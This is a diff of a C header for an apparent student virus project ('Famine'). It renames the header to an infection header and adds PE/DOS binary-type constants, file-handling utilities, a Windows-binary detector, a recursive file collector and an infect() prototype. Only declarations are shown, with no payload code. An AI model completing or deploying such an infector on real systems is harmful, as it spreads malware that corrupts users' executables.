@@ -1,17 +1,5 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   all.h                                              :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2017/07/01 18:05:22 by frmarinh          #+#    #+#             */
-/*   Updated: 2017/07/01 18:07:34 by frmarinh         ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
-
-#ifndef ALL_H
-# define ALL_H
+#ifndef INFECTION_H
+# define INFECTION_H
 
 # include <stdio.h>
 # include <locale.h>
@@ -39,6 +27,11 @@
 # define MAGIC_LENGTH		2
 # define DOS_MAGIC			"4D5A" // MZ - constant signature
 # define PE_SIGNATURE		"4550" // soit "PE\0\0"
+
+# define IS_UNKNOW_BINARY_TYPE	0
+# define IS_PE_BINARY_TYPE		1
+# define IS_DOS_BINARY_TYPE		2
+
 # define ARCHITECTURE_64	"20b" // 64b hex
 # define SIGNATURE 			"frmarinh-jguyet"
 # define STARTUP_VALUE		"Famine startup"
@@ -111,22 +104,22 @@ typedef unsigned __int32	uint32_t;
 	**	Les répertoires sont des parties du fichier utilisées lors de son chargement.
 	**	La position et la taille des données de ces répertoires sont indiquées.
 	*/
-	typedef struct			_IMAGE_DATA_DIRECTORY
+	typedef struct				_IMAGE_DATA_DIRECTORY
 	{
-		DWORD				VirtualAddress;
-		DWORD				Size;
-	}						IMAGE_DATA_DIRECTORY;
+		DWORD					VirtualAddress;
+		DWORD					Size;
+	}							IMAGE_DATA_DIRECTORY;
 
-	typedef struct		_IMAGE_FILE_HEADER
+	typedef struct				_IMAGE_FILE_HEADER
 	{
-	  WORD  			Machine;
-	  WORD  			NumberOfSections;
-	  DWORD 			TimeDateStamp;
-	  DWORD 			PointerToSymbolTable;
-	  DWORD 			NumberOfSymbols;
-	  WORD  			SizeOfOptionalHeader;
-	  WORD  			Characteristics;
-  	}					IMAGE_FILE_HEADER;
+	  WORD  					Machine;
+	  WORD  					NumberOfSections;
+	  DWORD 					TimeDateStamp;
+	  DWORD 					PointerToSymbolTable;
+	  DWORD 					NumberOfSymbols;
+	  WORD  					SizeOfOptionalHeader;
+	  WORD  					Characteristics;
+  	}							IMAGE_FILE_HEADER;
 
 	/*
 	**	Optional information about PE
@@ -209,6 +202,37 @@ typedef struct		s_pe
 	IMAGE_NT_HEADERS*	pe_header;
 }					t_pe;
 
+/*
+** UTILS
+*/
+char			*ft_strnew(size_t size);
+BOOLEAN			file_exists(const char *filename);
+BOOLEAN			is_directory(const char *filename);
+char			*file_get_contents(const char *filename);
+size_t			file_get_contents_size(char **content, const char *filename);
+size_t			file_get_contents_len_size(char **content, const char *filename, size_t size);
+BOOLEAN			file_put_contents(const char *filename, const char *content);
+BOOLEAN			file_put_contents_size(const char *filename, const char *content, size_t size);
+size_t			array_length(char **array);
+void			free_array(char **array);
+char			*file_base_name(const char *file_path);
+char			*file_absolute_path(const char *file_path);
+char			**ft_split_string(char const *s, char *c);
+char			*ft_dstrjoin(char *s1, char *s2, short flag);
+char			*ft_strtoupper(char *str);
+/*
+** WINDOWS BINARY UTILS
+*/
+int 			get_windows_binary_type(char *header);
+bool			is_windows_binary_file(char *file_path);
+/*
+** GETTER
+*/
+char			**get_files_types(char **files, char *start_path, bool f(char *file_path));
+/*
+** INFECTION
+*/
+void			infect(void);
 /*
 **	MAIN
 */
